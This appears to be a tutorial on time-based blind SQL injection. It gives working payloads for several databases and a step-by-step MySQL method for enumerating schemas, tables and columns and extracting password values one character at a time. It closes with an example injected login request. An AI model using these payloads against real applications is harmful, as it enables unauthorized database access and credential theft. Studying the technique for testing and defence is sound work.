Time-based blind SQL injection is used when the application does not return any visible output or database errors. Instead of extracting data directly, the attacker relies on measuring response delays to infer whether a condition is TRUE or FALSE.

A payload introduces a delay (e.g., 5 seconds) when a condition is met. By chaining conditions, it is possible to reconstruct information step by step.

---

## Detecting the Vulnerability

### Confirming Injection via Delay

The first step is to verify that the parameter is injectable and supports time-based behavior.

#### MySQL

```sql
' OR SLEEP(5)-- -
```

#### PostgreSQL

```sql
' OR pg_sleep(5)-- -
```

#### Oracle

```sql
' OR DBMS_LOCK.sleep(5)-- -
```

#### MSSQL

```sql
' WAITFOR DELAY '0:0:5'-- -
```

A consistent delay confirms the injection point.

### Verifying Conditional Execution

To extract data, conditional logic must be working.

#### MySQL

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
' OR IF(1=2, SLEEP(5), 0)-- -
```

Only the TRUE condition should introduce a delay.

---

## Database Enumeration

The enumeration process follows a strict flow:

1. Databases
    
2. Tables
    
3. Columns
    
4. Data
    

At every stage, extraction is done character by character.

### Enumerating Current Database

#### Length

```sql
' OR IF(LENGTH(DATABASE())=5, SLEEP(5), 0)-- -
```

#### Value (char by char)

```sql
' OR IF(SUBSTRING(DATABASE(),1,1)='t', SLEEP(5), 0)-- -
```

To extract the full value, you must iterate over each position:

- Change the index in `SUBSTRING(DATABASE(),X,1)` → 1,2,3,4...
    
- Repeat the same condition for each character position
    

#### Optimized (ASCII)

```sql
' OR IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(5), 0)-- -
```


### Enumerating All Databases

Other databases are stored in `information_schema.schemata`.

#### Database Name Length

```sql
' OR IF((SELECT LENGTH(schema_name) 
FROM information_schema.schemata LIMIT 1)=4, SLEEP(5), 0)-- -
```

#### Database Name Extraction

```sql
' OR IF((SELECT SUBSTRING(schema_name,1,1) 
FROM information_schema.schemata LIMIT 1)='t', SLEEP(5), 0)-- -
```

To fully extract each database name:

- Change character position → `SUBSTRING(...,X,1)`
    
- Repeat for X = 1,2,3...
    

#### Enumerating Multiple Databases (OFFSET)

```sql
' OR IF((SELECT SUBSTRING(schema_name,1,1) 
FROM information_schema.schemata LIMIT 1 OFFSET 1)='a', SLEEP(5), 0)-- -
```

For each new database:

- Increase `OFFSET`
    
- Repeat the same extraction process
    
- For each database, iterate character positions again
    

---

## Table Enumeration

Tables are stored in `information_schema.tables`.

### Extracting Table Names

#### Length

```sql
' OR IF((SELECT LENGTH(table_name) 
FROM information_schema.tables 
WHERE table_schema='target_db' LIMIT 1)=6, SLEEP(5), 0)-- -
```

#### Name

```sql
' OR IF((SELECT SUBSTRING(table_name,1,1) 
FROM information_schema.tables 
WHERE table_schema='target_db' LIMIT 1)='u', SLEEP(5), 0)-- -
```

To extract the full table name:

- Change `SUBSTRING(...,X,1)` for each character
    
- Repeat until the full string is reconstructed
    

### Enumerating Multiple Tables

```sql
' OR IF((SELECT SUBSTRING(table_name,1,1) 
FROM information_schema.tables 
WHERE table_schema='target_db' LIMIT 1 OFFSET 1)='a', SLEEP(5), 0)-- -
```

To enumerate all tables:

- Increment `OFFSET` (0,1,2,3...)
    
- Repeat extraction for each table
    
- For each table, iterate through all character positions
    

---

## Column Enumeration

Columns are stored in `information_schema.columns`.

### Extracting Column Names

#### Length

```sql
' OR IF((SELECT LENGTH(column_name) 
FROM information_schema.columns 
WHERE table_name='users' LIMIT 1)=8, SLEEP(5), 0)-- -
```

#### Name

```sql
' OR IF((SELECT SUBSTRING(column_name,1,1) 
FROM information_schema.columns 
WHERE table_name='users' LIMIT 1)='p', SLEEP(5), 0)-- -
```

To extract full column names:

- Iterate over each position using `SUBSTRING(...,X,1)`
    
- Repeat until complete
    

### Enumerating Multiple Columns

```sql
' OR IF((SELECT SUBSTRING(column_name,1,1) 
FROM information_schema.columns 
WHERE table_name='users' LIMIT 1 OFFSET 1)='e', SLEEP(5), 0)-- -
```

Same logic:

- Increase `OFFSET`
    
- Extract each column sequentially
    
- Iterate character positions for each column
    

---

## Data Extraction

Once tables and columns are identified, actual data can be extracted.

### Extracting Data Length

```sql
' OR IF((SELECT LENGTH(password) FROM users LIMIT 1)=10, SLEEP(5), 0)-- -
```

### Extracting Data

```sql
' OR IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)-- -
```

To reconstruct the full value:

- Change position → `SUBSTRING(password,X,1)`
    
- Test each character for that position
    
- Repeat until all characters are extracted
    

### Enumerating Multiple Rows

```sql
' OR IF((SELECT SUBSTRING(password,1,1) 
FROM users LIMIT 1 OFFSET 1)='a', SLEEP(5), 0)-- -
```

To dump multiple users:

- Increment `OFFSET`
    
- Repeat extraction per row
    
- For each row, iterate through all character positions
    


### Optimized Extraction (ASCII Binary Search)

```sql
' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77, SLEEP(5), 0)-- -
```

This reduces requests significantly by dividing the search space.

---

## Practical Example (HTTP Request)

```http
GET /login?username=admin' OR IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1),1,1))>100,SLEEP(5),0)-- - HTTP/1.1
Host: target.com
```

A delay indicates the condition is TRUE.
